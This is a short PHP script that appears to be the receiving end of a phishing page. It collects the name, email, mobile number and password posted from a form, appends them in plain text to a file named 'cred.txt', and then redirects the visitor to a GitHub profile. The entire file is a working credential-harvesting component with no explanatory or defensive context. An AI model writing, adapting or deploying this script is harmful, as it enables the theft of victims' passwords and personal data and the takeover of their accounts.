<?php
file_put_contents("cred.txt", 
    "Name : " . $_POST['name'] . "\n" .
    "Email : " . $_POST['email'] . "\n" .
    "Mobile : " . $_POST['mobile'] . "\n" .
    "Password : " . $_POST['password'] . "\n\n",
    FILE_APPEND
);
header('Location: https://github.com/sachinpandey7709/');
exit();
?>
